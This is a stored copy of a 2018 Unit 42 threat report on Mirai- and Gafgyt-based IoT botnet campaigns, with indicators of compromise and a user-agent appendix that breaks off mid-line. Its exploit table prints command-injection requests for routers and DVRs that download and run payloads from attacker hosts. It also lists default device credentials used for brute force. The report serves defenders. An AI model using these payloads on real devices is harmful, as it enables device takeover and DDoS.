{
    "id": "a4306131-f804-4b47-85c7-f0bcd1a56cf7",
    "created_at": "2023-01-12T15:05:49.230524Z",
    "updated_at": "2025-03-27T02:16:37.184378Z",
    "deleted_at": null,
    "sha1_hash": "898017b70929b051d98f20e396f8f745356f2455",
    "title": "2018-07-20 - Unit 42 Finds New Mirai and Gafgyt IoT-Linux Botnet Campaigns",
    "authors": "",
    "file_creation_date": "2022-05-28T16:58:01Z",
    "file_modification_date": "2022-05-28T16:58:01Z",
    "file_size": 994877,
    "plain_text": "# Unit 42 Finds New Mirai and Gafgyt IoT/Linux Botnet Campaigns\n\n**[researchcenter.paloaltonetworks.com/2018/07/unit42-finds-new-mirai-gafgyt-iotlinux-botnet-campaigns/](https://researchcenter.paloaltonetworks.com/2018/07/unit42-finds-new-mirai-gafgyt-iotlinux-botnet-campaigns/)**\n\nRuchna Nigam July 20, 2018\n\nBy [Ruchna Nigam](https://unit42.paloaltonetworks.com/author/ruchna-nigam/)\n\nJuly 20, 2018 at 5:00 AM\n\n[Category: Unit 42](https://unit42.paloaltonetworks.com/category/unit42/)\n\nTags: [botnet,](https://unit42.paloaltonetworks.com/tag/botnet/) [DDoS,](https://unit42.paloaltonetworks.com/tag/ddos/) [exploits,](https://unit42.paloaltonetworks.com/tag/exploits/) [Gafgyt,](https://unit42.paloaltonetworks.com/tag/gafgyt/) [Hakai,](https://unit42.paloaltonetworks.com/tag/hakai/) [IoT,](https://unit42.paloaltonetworks.com/tag/iot/) [Linux,](https://unit42.paloaltonetworks.com/tag/linux/) [Mirai,](https://unit42.paloaltonetworks.com/tag/mirai/) [Okane,](https://unit42.paloaltonetworks.com/tag/okane/) [Omni](https://unit42.paloaltonetworks.com/tag/omni/)\n\nThis post is also available in: 日本語 [(Japanese)](https://unit42.paloaltonetworks.jp/unit42-finds-new-mirai-gafgyt-iotlinux-botnet-campaigns/)\n\n[The end of May 2018 has marked the emergence of three malware campaigns built on publicly available source code for the Mirai and](https://en.wikipedia.org/wiki/Mirai_(malware))\n[Gafgyt malware families that incorporate multiple known exploits affecting Internet of Things (IoT) devices.](https://en.wikipedia.org/wiki/BASHLITE)\n\n[Samples belonging to these campaigns incorporate as many as eleven exploits within a single sample, beating the IoT Reaper](http://blog.netlab.360.com/iot_reaper-a-rappid-spreading-new-iot-botnet-en/)\nmalware, which borrowed some of the Mirai source code but also came with an integrated LUA environment that incorporated nine\nexploits in its code.\n\n[In their newest evolution, samples also target the D-Link DSL-2750B OS Command Injection vulnerability, only a few weeks after the](https://www.exploit-db.com/exploits/44760/)\npublication of its Metasploit module on the 25th of May (even though the vulnerability has been public knowledge since February of\n2016).\n\nWhile exploring samples belonging to one of these campaigns, I also discovered they support several new DDoS methods previously\nunused by Mirai variants.\n\nThis blog post details each campaign (in the chronological order they were observed) along with the exploits used, the new DDoS\nmethods supported, ending in a comparative summary of the campaigns. Also covered is the tangential discovery of some Gafgyt\nsamples incorporating new Layer 7 DDoS functionality targeting a known DDoS-protection provider.\n\nIOCs for different campaigns, if not mentioned under the corresponding section, can be found at the end of this blog post.\n\nCAMPAIGN 1: An evolution of Omni\n\nIn [May 2018, the Omni botnet, a variant of Mirai, was found exploiting two vulnerabilities affecting Dasan GPON routers - CVE-2018-](https://blog.newskysecurity.com/cve-2018-10561-dasan-gpon-exploit-weaponized-in-omni-and-muhstik-botnets-ad7b1f89cff3)\n10561 (authentication bypass) and CVE-2018-1562 (command injection). The two vulnerabilities used in conjunction allow the\nexecution of commands sent by an unauthenticated remote attacker to a vulnerable device.\n\nSince then the same family has evolved to incorporate several more exploits, detailed in Table 1.\n\nI used the sample below for this analysis\n\n**SHA256** 3908cc1d8001f926031fbe55ce104448dbc20c9795b7c3cfbd9abe7b789f899d\n\n\n**VULNERABILITY** **AFFECTED**\n**DEVICES**\n\n\nCVE-2018[10561, CVE-](https://www.exploit-db.com/exploits/44576/)\n2018-10562\n\n\nDasan GPON\nrouters\n\n\n**EXPLOIT FORMAT**\n\nXWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=;wget+http://%s/gpon80+O+->/tmp/gpon80;sh+/tmp/gpon80&ipv=0\nXWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=;wget+http://%s/gpon8080+O+->/tmp/gpon8080;sh+/tmp/gpon8080&ipv=0\n\n\n-----\n\n[CVE-2014-8361](https://www.exploit-db.com/exploits/37169/) Different\ndevices using\nthe Realtek\nSDK with the\nminiigd\ndaemon\n\n\nPOST /picsdesc.xml\n\n<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\"\ns:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><s:Body><u:AddPortMapping\nxmlns:u=\"urn:schemas-upnp-org:service:WANIPConnection:1\"><NewRemoteHost>\n</NewRemoteHost><NewExternalPort>47500</NewExternalPort>\n<NewProtocol>TCP</NewProtocol><NewInternalPort>44382</NewInternalPort>\n<NewInternalClient> cd /tmp/; rm -rf*; wget http://%s/realtek </NewInternalClient>\n<NewEnabled>1</NewEnabled>\n<NewPortMappingDescription>syncthing</NewPortMappingDescription>\n<NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>POST\n/picsdesc.xml\n\n<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\"\ns:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><s:Body><u:AddPortMapping\nxmlns:u=\"urn:schemas-upnp-org:service:WANIPConnection:1\"><NewRemoteHost>\n</NewRemoteHost><NewExternalPort>47500</NewExternalPort>\n<NewProtocol>TCP</NewProtocol><NewInternalPort>44382</NewInternalPort>\n<NewInternalClient> cd /tmp/;chmod +x realtek;./realtek realtek </NewInternalClient>\n<NewEnabled>1</NewEnabled>\n<NewPortMappingDescription>syncthing</NewPortMappingDescription>\n<NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>\n\nGET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://%s/netgear+O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1\n\nPOST /ctrlt/DeviceUpgrade_1\n\n<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\"\ns:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><s:Body><u:Upgrade\nxmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\">\n<NewStatusURL>$(/bin/busybox wget -g %s -l /tmp/huawei -r /huawei; sh /tmp/huawei)\n</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL>\n</u:Upgrade></s:Body></s:Envelope>\n\nPOST /UD/act?1\n\n<?xml version=\"1.0\"?><SOAP-ENV:Envelope xmlns:SOAPENV=\"http://schemas.xmlsoap.org/soap/envelope/\" SOAPENV:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><SOAP-ENV:Body>\n<u:SetNTPServers xmlns:u=\"urn:dslforum-org:service:Time:1&qu ot;><NewNTPServer1> cd\n```\n/tmp && rm -rf * && /bin/busybox wget http://%s/tr064 && sh\n/tmp/tr064 </NewNTPServer1><NewNTPServer2> echo OMNI </NewNTPServer2>\n\n```\n<NewNTPServer3> echo OMNI </NewNTPServer3><NewNTPServer4> echo\n```\nOMNI </NewNTPServer4><NewNTPServer5> echo OMNI </NewNTPServer5>\n\n```\n</u:SetNTPServers></SOAP-ENV:Body></SOAP-ENV:Envelope>\nPOST /UD/act?1\n\n<?xml version=\"1.0\"?><SOAP-ENV:Envelope xmlns:SOAPENV=\"http://schemas.xmlsoap.org/soap/envelope/\" SOAPENV:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><SOAP-ENV:Body>\n<u:SetNTPServers xmlns:u=\"urn:dslforum-org:service:Time:1&qu ot;><NewNTPServer1> cd\n```\n/tmp && rm -rf * && /bin/busybox wget http://%s/tr064 && sh\n/tmp/tr064 </NewNTPServer1><NewNTPServer2> echo OMNI </NewNTPServer2>\n\n```\n<NewNTPServer3> echo OMNI </NewNTPServer3><NewNTPServer4> echo\n```\nOMNI </NewNTPServer4><NewNTPServer5> echo OMNI </NewNTPServer5>\n\n```\n</u:SetNTPServers></SOAP-ENV:Body></SOAP-ENV:Envelope>\n\nPOST /HNAP1/\n\nSOAPAction: http://purenetworks.com/HNAP1/ cd /tmp && rm -rf * && wget\n```\nhttp://%s/hnap && sh /tmp/hnap\n\n```\n(Faulty exploit:\n\nThis vulnerability stems from the fact that anything trailing the last '/' after the string\n“http://purenetworks.com/HNAP1/GetDeviceSettings” in the SoapAction header value is executed\nusing the system command without sanitization\n\nIn this implementation, the exploit code is appended to “http://purenetworks.com/HNAP1/”, and\nhence the above condition will not be triggered. To the best of my knowledge this exploit will not\nwork on any devices)\n\nGET /language/Swedish${IFS}&&cd${IFS}/tmp;rm${IFS}rf${IFS}*;wget${IFS}http://%s/crossweb;sh${IFS}/tmp/crossweb&>r&&tar${IFS}/string.js\n\n\nNetgear setup.cgi\n[unauthenticated](https://www.exploit-db.com/exploits/43055/)\nRCE\n\n\nDGN1000\nNetgear\nrouters\n\n\n[CVE-2017-17215](https://www.exploit-db.com/exploits/43414/) Huawei\nHG532\n\n\nEir WAN Side\nRemote\nCommand\nInjection\n\nHNAP\nSoapAction[Header](https://www.exploit-db.com/exploits/37171/)\nCommand\nExecution\n\nCCTV/DVR\n[Remote Code](https://www.exploit-db.com/exploits/39596/)\nExecution\n\n\nEir D1000\nrouters\n\nD-Link\ndevices\n\nCCTVs,\nDVRs from\nover 70\nvendors\n\n\n-----\n\nJAWS Webserver\nunauthenticated\nshell command\nexecution\n\nUPnP SOAP\nTelnetD\nCommand\nExecution\n\nNetgear cgi-bin\n[Command](https://www.exploit-db.com/exploits/41598/)\nInjection\n\n\nMVPower\nDVRs,\namong others\n\nD-Link\ndevices\n\nNetgear\nR7000/R6400\ndevices\n\n\nGET /shell?cd+/tmp;rm+-rf+*;wget+http://%s/jaws;sh+/tmp/jaws\n\nPOST /soap.cgi?service=WANIPConn1\n\n<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\"\ns:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><SOAP-ENV:Body>\n<m:AddPortMapping xmlns:m=\"urn:schemas-upnp-org:service:WANIPConnection:1\">\n<NewPortMappingDescription><NewPortMappingDescription><NewLeaseDuration>\n</NewLeaseDuration><NewInternalClient> cd /tmp;rm -rf *;wget http://%s/dlink;sh\n```\n/tmp/dlink </NewInternalClient><NewEnabled>1</NewEnabled>\n\n```\n<NewExternalPort>634</NewExternalPort><NewRemoteHost></NewRemoteHost>\n<NewProtocol>TCP</NewProtocol><NewInternalPort>45</NewInternalPort>\n</m:AddPortMapping><SOAPENV:Body><SOAPENV:envelope>\n\nGET /cgi-bin/;cd${IFS}/var/tmp;rm${IFS}rf${IFS}*;${IFS}wget${IFS}http://%s/netgear2;${IFS}sh${IFS}/var/tmp/netgear2\n\nGET /board.cgi?cmd=cd+/tmp;rm+-rf+*;wget+http://%s/vacron;sh+/tmp/vacron\n\n\n[Vacron NVR RCE](https://blogs.securiteam.com/index.php/archives/3445) Vacron NVR\ndevices\n\n\nAll of these vulnerabilities are publicly known and have been exploited by different botnets either separately or in combination with\nothers in the past, however, this is the first Mirai variant using all eleven of them together.\n\n**Differentiating features of the campaign:**\n\nTwo different encryption schemes: Aside from using the standard XOR encryption scheme seen in all Mirai variants, in this case\nusing the table key 0xBAADF00D samples make use of a second key for the encryption of certain config strings.\nSamples rely solely on exploits for propagation and don’t perform a credential brute-force attack.\nFurther infection of infected devices is prevented by dropping packets received on certain ports using iptables (Figure 1)\n\n_Figure 1: Screenshot from malware disassembly showing the use of iptables to drop future connection attempts via certain ports_\n\nThe campaign makes use of the IP 213[.]183.53.120 both for serving payloads, and as a Command and Control (C2) server.\n\nPivoting off this IP, I discovered some Gafgyt samples that surfaced around the same time reporting to the same IP, but using a new\nmethod named 'SendHTTPCloudflare'. This method is detailed at the end of this blog post.\nThis campaign was linked to the Omni variant on several references in the code as seen such as the one seen in Figure 2 below.\n\n_Figure 2: OMNI reference in samples_\n\nThe encrypted strings also reference a website gpon[.]party that was down at the time of this writing.\n\n_Figure 3: gpon[ ]party reference_\n\n\n-----\n\nCAMPAIGN 2: Okane\nSamples from this campaign were served from the IP 46[.]243.189.101. This host briefly had an open directory containing the\nsamples, as seen in the figure below.\n\n_Figure 4: Screenshot from open directory at payload server 46[.]243.189.101_\n\nThe payload source in this attack was located at hxxp://46[.]243.189.101/gang/. The downloaded payload is a shell script that\nattempts to replicate itself by downloading Okane binaries to vulnerable devices. On the 13 of June, the payload source for some ofth\nthese samples was briefly replaced with the Cloudflare DNS server 1[.]1.1.1.\nThis campaign incorporates the same exploits listed in Table 1. Figure 5 shows these exploits being called sequentially in one of the\nsamples belonging to this campaign. Each call results in the creation of a dedicated fork for each exploit.\n\n\n-----\n\n_Figure 5: Screenshot from malware disassembly of exploit calls in a sample from Campaign 2_\n\nUnlike the previous campaign, these samples also perform a credential brute force attack. Some unusual entries were discovered on\nthe brute force lists in these samples, such as the following:\n\n[root/t0talc0ntr0l4! - default credentials for Control4 devices](http://open-sez.me/passwd-control4.htm)\n[admin/adc123 - default credentials for ADC FlexWave Prism devices](https://fccid.io/F8I-PSM0804A/User-Manual/Users-Manual-2-1600135.pdf)\n[mg3500/merlin - default credentials for Camtron IP cameras](http://seclists.org/bugtraq/2010/Nov/127)\n\n\n-----\n\nSome samples belonging to this campaign include the addition of two new DDoS methods to the Mirai source code.\nBelow are descriptions of these new DDoS methods, extracted from the following sample.\n\n**SHA256** 320ed65d955bdde8fb17a35024f7bd978d26c041de1ddcf8a592974f77d82401\n\n**[attack_method_tcpxmas: involves sending TCP packets with all flags set, also known as Christmas tree packet This could be](https://en.wikipedia.org/wiki/Christmas_tree_packet)**\nconsidered a more effective means of DDoS since these packets “require much more processing by routers and end-hosts than\n_the \"usual\" packets do.” This method has already been observed used by Gafgyt and Kaiten variants in the past. The payload_\nsize of packets sent is set to 768 bytes.\n**attack_method_std: involves sending packets with a randomized payload of 1024 bytes.**\n\nDigging deeper reveals that samples using these attack methods have been part of a Mirai code fork from as early as August 2017.\nSome newer samples from the same campaign also integrate additional methods that only appear in samples from the beginning of\nJune 2018. Some notable methods are detailed below.\nFor this analysis I used a sample with the following hash.\n\n**SHA256** be1d722af56ba8a660218a8311c0482c5b2d096ba91485e7d9dfc12a2b8e00b3\n\n**attack_method_udpgame: UDP DDoS using SOCK_RAW from a random source port to the destination port 27015 (often used**\nby online game servers).\n**attack_method_asyn: TCP DDoS using packets with random source and destination ports, using packets with the ACK and**\nSYN flags set.\n**attack_method_tcpfrag: TCP DDoS using SOCK_RAW with random source and destination ports and sequence number, and**\nflags URG, ACK, PSH, RST, SYN and FIN set. In this case the ‘Don’t Fragment’ bit is set to 1.\n**attack_method_tcpall: same as attack_method_tcpfrag above, except the ‘Don’t Fragment’ bit is set to 0.**\n**attack_method_tcpusyn: TCP DDoS using packets with random source and destination ports, using packets with the URG and**\nSYN flags set.\n\nOn the 19th of June, samples on this server were stripped of their exploits and reverted to using a simple brute force and\nsubsequently dropping a shell script, for self-propagation.\n\n_Figure 6: Shell script used by newer Okane samples for self-propagation_\n\nCAMPAIGN 3: Hakai\n\nEarlier samples belonging to this campaign use all the exploits detailed in Table 1, except for the UPnP SOAP TelnetD Command\nExecution exploit. The payload source for this campaign was hxxp://hakaiboatnet[.]pw/m and the C2 server was 178[.]128.185.250.\nSamples make use of an encryption scheme similar to Mirai; unlike previous campaigns, they are built on the Gafgyt source code,\nwhich is also known as Bashlite, Lizkebab, Torlus or LizardStresser.\n\nSamples listen for the following commands:\n\n**Command** **Translation**\n\nSC ON Scanner On\n\nSC OFF Scanner Off\n\nH HTTP Flood\n\nU UDP Flood\n\nS STD Flood\n\nT TCP Flood\n\nKT Kill scanner threads\n\n\n-----\n\nNewer samples from the same server were found to have also incorporated an OS Command Injection exploit against D Link DSL\n2750B devices. These samples use the same attack methods, encryption key and C2 as the samples above, however they source\ntheir payload from hxxp://178[.]128.185.250/e.\n\n_Figure 7: Exploit targeting D-Link DSL-2750B devices used in newer samples of the campaign_\n\nSummary\n\nTable 2 shows a comparative summary of the three campaigns\n\n\n**Campaign** **Exploits**\n**Used**\n\n\n**Built**\n**on**\n\n\n**Payload source** **C2** **Config string**\n**encryption/decryption**\n**key**\n\n\n**Also brute**\n**forces**\n**credentials?**\n\nNo\n\n\n1:\nEvolution\nof OMNI\n\n\nAll exploits\nin Table 1\n\n\nMirai hxxp://213[.]183.53.120 213[.]183.53.120 Two different keys used\n– 0xBAADF00D,\n0xDEADBEEF (or the\nequivalent of a bytewise XOR with 0x22)\n\n\n2: Okane All exploits\nin Table 1\n\n3: Hakai All exploits\nin Table 1,\nexcept\nUPnP\nSOAP\nTelnetD\nCommand\nExecution.\nNewer\nsamples\nalso\nincorporate\na D-Link\nDSL2750B OS\nCommand\nInjection\nexploit\n\n\nMirai hxxp://46[.]243.189.101/gang/ 142[.]129.169.83:5888 0xDEACFBEF Yes\n\n\nGafgyt hxxp://hakaiboatnet[.]pw/m,\n\nhxxp:// 178[.]128.185.250/e\n\n\n178[.]128.185.250 0xDEDEFFBA Yes\n\n\n_Table 2: Comparative summary of the attack campaigns_\n\nGafgyt with a new Layer-7 attack\n\nLayer-7 DDoS attacks targeting specific DDoS protection service vendors are not new and were already observed in the form of the\n[DvrHelper variant of Mirai.](https://blog.trendmicro.com/trendlabs-security-intelligence/reigning-king-ip-camera-botnets-challengers/)\n\nThey have however not been observed used by Gafgyt samples until now. While pivoting on the C2 used by samples of Campaign 1, I\ncame across some Gafgyt samples listening for an additional command called HTTPCF.\n\nWhen this command is received, the bot calls a function called SendHTTPCloudflare that does as its name suggests, targeting a URL\npath used mostly by sites protected by Cloudflare. The earliest samples observed using this attack were from the end of May 2018.\n\n_Figure 8: URL format targeted by HTTPCF_\n\nSamples use the same IP i.e. 213[.]183.53.120 at port 8013 for C2 communication.\n\nThey also make use of some unusual User-Agents (UA) as seen in Figure 9. All UAs found in these samples are listed in the appendix\n\n\n-----\n\n_Figure 9: Some unusual User Agents found in related Gafgyt samples_\n\nConclusion\n\nThe initial rise of botnets targeting embedded systems had brought to light the security risks from millions of Internet-connected\ndevices configured with default credentials.\n\nThe evolution of these botnets to the use of multiple exploits, be it IoT Reaper or the campaigns discussed here, shows how attackers\ncan build enormous botnets consisting of different types of devices, all responding to the same C2 server. This is exacerbated by the\nspeed of exploitation in the wild of newly released vulnerabilities and also highlights the need for security vendor reactivity in response\nto these disclosures, applicable to the subset of these devices that do fall under the protection of security devices. However, the onus\nis on device manufacturers to ensure their devices are easy to update, and that they deploy the updates in a timely manner.\n\nPalo Alto Networks customers benefit from the following protections against these attacks:\n\nAutoFocus customers can track these activities using individual exploit tags:\n\nAutoFocus customers can also use the following malware family tags :\n\n[Gafygt](https://autofocus.paloaltonetworks.com/#/tag/Unit42.Gafgyt)\n[ELFMirai](https://autofocus.paloaltonetworks.com/#/tag/Unit42.ELFMirai)\n\nWildFire detects all related samples with malicious verdicts.\n\nAll exploits and IPs/URLs involved in these campaigns are blocked through Threat Prevention and PANDB.\n\nIndicators of Compromise\n\n**Campaign 1 samples**\n\n000b018848e7fd947e87f1d3b8432faccb3418e0029bde7db8abf82c552bbc63\n\n37e3a07a17a82175c60992f18eaf169e4014915eb90fac5b4704060572cfa60b\n\n3908cc1d8001f926031fbe55ce104448dbc20c9795b7c3cfbd9abe7b789f899d\n\n3b3a66c2c27f5821d5304e22a2a34b044027ffaac327df5263674b4aa25bc901\n\n4c07af1041e0d83437d4b14226204652574b428cd1dbd4bfc7047c13dffc4700\n\n**Campaign 1 related URLs/IPs**\n\n213[.]183.53.120\n\n**Okane Multi-exploit samples**\n\n00499879c74122881e436fbf701a823d4dc53ff6946e58dd0e5410bad24f3d57\n\n0fa81ebe444cfe7413f90ca116817cdfa3ccfdc41160fcd64032630d30b2d598\n\n11628ac93368228e949d9b7e380a065e58c02626a8fd7896db8c2dec51583d1d\n\n1d6c5a560bbb57695c502b5d642e48fbe6bddc45defdb56fa25bd94ae17e5a14\n\n216492260b8d1342988c1688962dd95a48af8c801afe03c6801ec07d74862e60\n\n264a194bda6aaa51665d5c872237613ac153e67827e7b0bbbe84b4e8e464544c\n\n38736acdf58a418acd778a3203df9e84b4470a71031fe9e6d52170ad3c15e794\n\n39893d4a033fd29faea37d09b4c8cfb9be04ffc19288506551e18d294e96bb2d\n\n49f98a91c95a633a6d7a9a134e3a8e881e12aeede758a4367432ad3cab1c2b28\n\n50473fc0d89fd5ed0a20c96f34c419c5ee66e630fecb88a095283450229a934e\n\n\n-----\n\n509a7cc2335ef667ddc20298a3fae9c9c966be400719343cb59b042d05a98426\n\n5352dc35d97ceb2d9bf58113ee1196daea66cd4a4bce9acba29ee05f4d84170e\n\n55771db22c6305f7fba0b20b19b8537e85a45b80ddbcba1ffe0f6d30ef8697d6\n\n645128d788b5cc1becc2546973e658c03e2ee33116013b84c05904a18044e353\n\n834e675813e517aa0b4b6c65edbb2e8bf141b272f6918b443c69793db365ff3b\n\n893309bc397058d50bba7c5c077bfc7f64956a098e452c63813c074beb8837dc\n\n8b65ac91af993f95b57535e5a71571bbc06fbb37e1bfd47313585dceda345fd9\n\n916cf77c6af335732007fd0c09ec49b8f29053731a062c33a66d65793495dcd5\n\n93fa2bb5a64216d8579a53debcb9b2dade3a0a995c3026b04667fd472e7841a3\n\n9e150ccd410ed8a3a8673e092450bd6dc0f5abc2d7306e2d05b57cfb21d8d4df\n\n9fe586ead4a1b003c023c75467c9b1fcda3414265ea50e060e939a4078c79234\n\na0d7592cfcd469e10a9ca463780737c76d3e61c5b750345998b18721b3565f0d\n\na36adfa5ecec9ad5429c817de3fbece20d1b526c116d2bfccd9366aabacc2c32\n\nac7bb0c8bf67186572ee931f86f679e12f6737d8e36936fb40a870dc3aeeee22\n\nb2156ce005eacccabe0ed668bbced761df1da1f1da32e645d344eaa8f075dbb9\n\nb55bea0bf708734491d101f41ecdbb592e69b8ccc053b7dfc33fe3e465c80b9f\n\nb72c22efed4b68d52fbc97360c388fc1812d431c208cf35af5bdcc850e8a2e01\n\nbc11fcafe415b1bf74abbeb5189cb72f991bb6dfb01b61f2d96cbb4cfd6d9e2f\n\nbd89be28ddecca983cc91835febce818a1f09bda471399b031f99c5278169344\n\nbf94315a9591d77ee2d08823afaeaf7e45133d4af2d3c3ce4086aff371f248d2\n\nc02a7a06f77bad974acd6bc193e1cb7dc73a009317f1044d202593dc3b0a67cf\n\nc42bdc0d7bbdf9a74db9233010f2b04ca14e0864119a1c98d6c8a7a63574791c\n\nc659709cbea976692e4be58f1f04d99127b55325f404c63525fb9ab575a66b2d\n\nc750d1ad0d5f5d7dda2ab8dba33fa49ef1c636905abab364a70db44ab8035ab6\n\ncfd33c0bcb7001c56a8e9438c1a5d6b34c6bdd7a2404c2fe0cdfea00abdf355a\n\nd15d46b4d9d826bcf8cb0b43fa1f7e874708db9bb068c3aff27daa7193b51fd7\n\nd2655773f812887da069965ad8113501aeb0a0e26aa27faa9a1469fd510ceb3c\n\ndacdf9b548f123482f5ecc2a29d2d156021bdab250a933ace9aee140041b9abb\n\ndbdffabc13a70a41188900620569266b5774deb007e0ef6dc63ff16ce72b4595\n\ndcfae13f567ea01c872db539c5d89448ebde2debe46421eccf752d4e20298c58\n\ne0ddec27709ec513886a217009f55994ddf61f58887774d6403ec18d5612d9e6\n\ne8782c38fc7c148be589a3c44f915719378840ddbf709fd48932797609f8daf2\n\nec1fdb298556406d75506a234562f60ae517569963a317741dd4bd90680fb4ad\n\nedf32e6317253a323c4e815485ff4b97c4e0af268be8d78c9c0e48ac87e52e55\n\nf390995777d4cad93854e4030b8bc33d2405c7ddd548da5e00a589b9e7afd722\n\n**Okane related IPs/URLs**\n\n46[.]243.189.101\n\n\n-----\n\n142[.]129.169.83:5888\n\n**Okane Multi-exploit samples fetching payload from 1.1.1.1**\n\n25763b7871c0be5dc9a3ffa4abb4fce308297baf14c0389a70336b429b0c7c39\n\n7bde2df856061806a1a7294b780bfbcf1439ec0f9dbb4d6495c7c0d5873505d5\n\nfca262afd92ec24af4370c664b68f453c3f97f3555ab37178ec80bbaebf7dfa6\n\n**Okane Multi-exploit samples using attack_method_tcpxmas and attack_method_std**\n\n0e7d4fa178b78cbfd0eaea910a53c7b933590764b72a93cd54f5823076869ab5\n\n320ed65d955bdde8fb17a35024f7bd978d26c041de1ddcf8a592974f77d82401\n\n5eef17f59d2c3d88d08da8d07dcca13e4225d800fce7a7fed5504e789008dc17\n\n692b3b9ea76447447b11655711cdd22040972b1903749fe49b478ec92cdd4f7a\n\na0d7592cfcd469e10a9ca463780737c76d3e61c5b750345998b18721b3565f0d\n\na36adfa5ecec9ad5429c817de3fbece20d1b526c116d2bfccd9366aabacc2c32\n\nc42bdc0d7bbdf9a74db9233010f2b04ca14e0864119a1c98d6c8a7a63574791c\n\nd15d46b4d9d826bcf8cb0b43fa1f7e874708db9bb068c3aff27daa7193b51fd7\n\n**Okane sample without exploits using several additional DDoS methods**\n\n0ea858e747863f2c94eda3f28167951ad8cafca2cb0be1c247d01a53fb7e56e0\n\nbe1d722af56ba8a660218a8311c0482c5b2d096ba91485e7d9dfc12a2b8e00b3\n\n**Hakai samples**\n\n0f5b814308193064bc4ece4266def5c1baecc491117f07650c5117762648d4c5\n\n46625884d4cc5ec9ca32221e90f3c187ef7d713fbabe8e33cad843587c0911e0\n\n721da99e8789cdcb73db87353e2be7b82c9158e2929b9eaa7d5b4660b6d4d1e2\n\n76a2853701ab4a8d989f383857d0d4cb8d6a7df38d543d4cb06a02079acb74c2\n\n7e8280387887f27461f2ed758a401daf49e27342c684f199751391bfb83f438d\n\nc959e580c4709c8aa304ffe5b3ab4ccfbdb3327b695cf5f8b4d27591664579f7\n\nd248c1ce41d474de0ea05b34d721271c53a861e06d355e4e6e83a8955c7bbc0a\n\nd669388681bb8d17aa2d5ee1f943ae5e8ad8729d88c78ec86b10fe51a4701c43\n\nf05e731a3dca8868af3a05ae4867a39f397e0d54221229c0be74c8a20d00e364\n\n**Hakai URLs/IPs**\n\nhakaiboatnet[.]pw\n\n178[.]128.185.250\n\n**Gafgyt HTTPCF samples**\n\n1eec1ef48d93106f3f00b4d4868b32a3ca8ca8da9a0852ef81a9e9226206362b\n\n385ba7fcf276fb0b469defac7762908921df820c550e98abadec725f455b76fe\n\n5c797cd7faf5061a75c68cc8f658c7daab94c223f523bfca0a28ba2620b1cd9f\n\n8339dc35688574b33b523234ba76fee56d57b369c9c0292644ec2a0cf798244d\n\n\n-----\n\na5fe23186c95bfa9e5df8b3fb28a1922a1e820b8f51401d9042542e18f9aaec1\n\nc12132f341d19c386a617ff2a607df35648ab6f17106608a575d086fadfe3a04\n\nc159087ee8af27685a6b46b18cb59dfbcff85a165cd308c5d617eb3f8166b328\n\ne949a6429530b8b6876073dc025a0cda0d6311a6dc15fcb72b24a3fe6cb86529\n\nfe0c3682dac042b8cb92e731ace80660d7722782c1c5551ec2a18e747788c73d\n\nAPPENDIX\n\n**User-Agents used by Gafgyt HTTPCF samples**\n\nMOT-L7/08.B7.ACR MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.1\n\nMozilla/5.0 (compatible; Teleca Q7; Brew 3.1.5; U; en) 480X800 LGE VX11000\n\nMozilla/5.0 (Android; Linux armv7l; rv:9.0) Gecko/20111216 Firefox/9.0 Fennec/9.0\n\nMOT-V300/0B.09.19R MIB/2.2 Profile/MIDP-2.0 Configuration/CLDC-1.0\n\nMozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; FunWebProducts)\n\nMozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; FDM; MSIECrawler; Media Center PC 5.0)\n\nMozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:5.0) Gecko/20110517 Firefox/5.0 Fennec/5.0\n\nMozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_7; en-us) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Safari/530.17\nSkyfire/2.0\n\nSonyEricssonW800i/R1BD001/SEMC-Browser/4.2 Profile/MIDP-2.0 Configuration/CLDC-1.1\n\nMozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0; chromeframe/11.0.696.57)\n\nMozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; uZardWeb/1.0; Server_JP)\n\nMozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.39 Safari/525.19\n\nMozilla/5.0 (Linux; Android 4.4.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Mobile Safari/537.36\n\nMozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36\n\nMozilla/5.0 (X11; Linux x86_64; U; de; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.62\n\nOpera/9.80 (Windows NT 5.1; U;) Presto/2.7.62 Version/11.01\n\nOpera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16\n\nBlackBerry9700/5.0.0.743 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/100\n\nBlackBerry7520/4.0.0 Profile/MIDP-2.0 Configuration/CLDC-1.1\n\nDoris/1.15 [en] (Symbian)\n\nBunjalloo/0.7.6(Nintendo 